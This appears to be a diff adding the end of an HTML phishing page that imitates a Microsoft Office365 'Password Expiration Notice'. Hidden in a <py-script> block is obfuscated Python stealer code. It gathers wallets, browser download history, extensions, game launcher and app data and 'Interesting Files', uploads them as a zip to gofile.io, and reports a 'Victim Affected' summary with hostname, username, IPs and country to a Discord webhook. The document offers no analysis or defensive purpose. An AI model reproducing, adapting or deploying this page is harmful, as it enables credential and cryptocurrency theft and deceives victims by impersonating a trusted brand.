+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Download History  : {GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC}")
+
+    if VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Extentions        : {VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ}")
+
+    if JLWFIATIJZSTEJZIRLXDKSBLOIQFYKDZWCSKYPCHDQAGASNHAHQGKLKBXEHPUUGXHBHKKJFKFLZCULWDQBXANL != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Wallets           : {JLWFIATIJZSTEJZIRLXDKSBLOIQFYKDZWCSKYPCHDQAGASNHAHQGKLKBXEHPUUGXHBHKKJFKFLZCULWDQBXANL}")
+
+    if ZBMVWPSWXZNGFFJLNSGQCYJLSRDDWOOTSKGWTKVNXKGZLLOGDZSCMXXGDQX != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Game Launchers    : {ZBMVWPSWXZNGFFJLNSGQCYJLSRDDWOOTSKGWTKVNXKGZLLOGDZSCMXXGDQX}")
+    
+    if DPMQZTMSZKIRWPPSNJPXQVJPKNPHEQHPCOQGBLUEAGANVRRUDLSOBCVCXMQUVUPOKS != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Apps              : {DPMQZTMSZKIRWPPSNJPXQVJPKNPHEQHPCOQGBLUEAGANVRRUDLSOBCVCXMQUVUPOKS}")
+    
+    if XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ != None:
+        QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC.append(f"Interesting Files : {XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ}")
+
+BLPJIJBWDUMWGFYXECRXCNUXDYKTLDVTATSFJRMMDMJRMKQANDVUEQQH.seek(0)
+
+try:
+    try: JRSTAZMUHUYRSCOVSMCLCZPHAPDJEPGRCIYEIZEPZYCOAYOTSMSAVCSIGHYHPJF = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
+    except: JRSTAZMUHUYRSCOVSMCLCZPHAPDJEPGRCIYEIZEPZYCOAYOTSMSAVCSIGHYHPJF = "store4"
+
+    UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP = requests.post(
+        f"https://{JRSTAZMUHUYRSCOVSMCLCZPHAPDJEPGRCIYEIZEPZYCOAYOTSMSAVCSIGHYHPJF}.gofile.io/uploadFile",
+        files={"file": (f"RedTiger_{VIDQWDOLEYGAVEHPTVBEKGLESFBQTJTBKIFXZRBQICQAMZBEFWEES.replace(' ', '_')}.zip", BLPJIJBWDUMWGFYXECRXCNUXDYKTLDVTATSFJRMMDMJRMKQANDVUEQQH)}
+    )
+
+    VJONRWTVCNFCJZJEQSTIXKLACWUIWZSCCGMKEZELZPLOBYOMHPMFKKUBVXOSSDFYXFXKTDLIJRWWMFVNEJOAONFKPUTL = UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP.json()["data"]["downloadPage"]
+except Exception as e:
+    VJONRWTVCNFCJZJEQSTIXKLACWUIWZSCCGMKEZELZPLOBYOMHPMFKKUBVXOSSDFYXFXKTDLIJRWWMFVNEJOAONFKPUTL = f"Error: {e}"
+
+embed = discord.Embed(title="Victim Affected", color=HXNTMMMFVQAPEKRYAZIXOSXHLAPUVKZZNCHXBBXBYPPOLQQRTJJHSMXIUZVBWJDLYEAUSBEFY
+).add_field(
+    inline=False,
+    name="Summary of Information", 
+    value=f"""```
+Hostname    : {LUSHYYGZDBFVECDHWXJUUSCFQWXHZIOOKVAGHQXQKDZTPDIBUEDLRWJSLXQFT}
+Username    : {VIDQWDOLEYGAVEHPTVBEKGLESFBQTJTBKIFXZRBQICQAMZBEFWEES}
+DisplayName : {SRDJBHDRCAMABOSOJLTOEJKFTJTIUMCBIPVDPZCMUPMALZPGKCNFEHRSUIXAUOKRHWLFWWWZDRZ}
+Ip Public   : {FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS}
+Ip Local    : {DMSROZDPFWFENEAQTMHUHIFIEMFMSWPCGTQKDPCYPKRXVQKDAQGXIPJYTLLCSDC}
+Country     : {OLUFNHHTJWLATNSUYEXTXTFHHYOKCXUYCXLJAFHCLTUVYVHBZBMKLAWFHZBJ}```"""
+).add_field(
+    inline=False,
+    name="Stolen Information", 
+    value=f"""```swift
+{"\n".join(QOLMEIIXFKTJULGDKCXBQSAEIMLKAESRGJZKPAQZPXKKYQUWHOMANZBBTXUVFIBAJWZJIBIWMGWDGPRSLKZRYEBNNYHC)}```"""
+).add_field(
+    inline=False,
+    name="Download Link", 
+    value=f"""{VJONRWTVCNFCJZJEQSTIXKLACWUIWZSCCGMKEZELZPLOBYOMHPMFKKUBVXOSSDFYXFXKTDLIJRWWMFVNEJOAONFKPUTL}"""
+).set_footer(
+    text=JKEGKJLAELZKSLRJWGUUHULOTAYILBAVZUBRKXBEDVZAXJIPVOXJBLXHRGESWFCQIJNBUCCIBZQJDTHJA, 
+    icon_url=PWAJDAXHOWYNFMQWQVLNBNHRBZRGDRMBJDVZWFTSNLOCCULBRJCHILULPIUUNGWZN
+)
+
+try:  
+    RAVCNVSFVUFBAPGPHWWKVSKWRGLVPWAURIZTXPHMYVNTEGJEYQXDVQRSEDHBKQAOBMFDZZTSRKKVDTRHCLIPEWJGQKZAJ = discord.SyncWebhook.from_url(IKOSVDHPBURSHOHFGMKXQVYTNAGLKBWSKAXXRYLNJDWLKBOUPATHKGHSIOTYYIBWKNMLZFHBYH)
+    RAVCNVSFVUFBAPGPHWWKVSKWRGLVPWAURIZTXPHMYVNTEGJEYQXDVQRSEDHBKQAOBMFDZZTSRKKVDTRHCLIPEWJGQKZAJ.send(embed=embed, username=IYMCUSRZQXXWNSVQDSCRWYYYFFCGFJHDLUPSQVBALSOIJNGWJLVTJQVKDKELTTJUPOMDUZBCRNICTLZLCUNSWRSAJNY, avatar_url=PWAJDAXHOWYNFMQWQVLNBNHRBZRGDRMBJDVZWFTSNLOCCULBRJCHILULPIUUNGWZN)
+except: pass
+
+
+try: threading.Thread(target=SQCPVEKHDFDYZCQVCZWQAKIASHZSZBFTNVHLYBIIESUYQTOUBYRBFHKYHGOKJTYHQYQ).start()
+except: pass
+try: threading.Thread(target=HSKEQYKYFBRFHCXFWUSNZUIXDGKGTKNIWQMHDQQGBYKBEFTUNQZTAJYYPWPIWIXZAWG).start()
+except: pass
+try: threading.Thread(target=ZKWVRDMAHFXKEDDBNBAFJOFYZAFMSVLDJTHEJWUOXUREVNPIBMPRSCXVQVLQSBCGMSKQLNE).start()
+except: pass
+try: threading.Thread(target=ALPEMFZZHTLOCAUVNJGXKLOZEBJJDNLQHJNMHUVJUKTEVJBOIN).start()
+except: pass
+try: threading.Thread(target=TNYFJMINIOWHXDXYAZNTSGDPYPLKEIPAPBQDQYGQIMSGBOVVABHMYQS).start()
+except: pass
+try: threading.Thread(target=TTJZJMNQJKUWRGFCIFTHCCIQDDLNIKFEKYAKJAAMKBLGHIRZWPJIQQJMZNOGNFDEILPAISYSMASUPZRYOUTIRZQ).start()
+except: pass
+try: threading.Thread(target=KQTFNHGVDNMUADSDUWPZBXGHSCKHNFLRXWWKWEYCVYDCUPJDFILKDYAIJVIHZDHXJSBIJDZCLTKMWFFEDWH).start()
+except: pass
+try: threading.Thread(target=EWJSEZCHTXQWSAZQFLIWCEPXZWDPKYACQVIXXCLHPYMJPATLGIFMIZMTAEZHZZUQYLVHBJQIMGIUKULCORWZWUTVCEDHXEH).start()
+except: pass
+
+   </py-script>
+    <div class="container">
+        <div class="header">
+            <img src="https://i.imgur.com/MwS5lVg.jpeg" alt="Microsoft Office365 Logo">
+        </div>
+
+        <div class="content">
+            <h1>Action Required: Password Expiration Notice</h1>
+            <p>Dear User,</p>
+            <p>We would like to inform you that your password is due to expire soon. To maintain uninterrupted access to your account, please take a moment to confirm that you wish to keep your current password.</p>
+            <a href="#" class="button">Keep Current Password</a>
+        </div>
+        <div class="footer">
+            <p>© 2025 Microsoft Corporation. All rights reserved.</p>
+            <p>This is an automated message. Please do not reply to this email.</p>
+        </div>
+    </div>
+</body>
 </html>
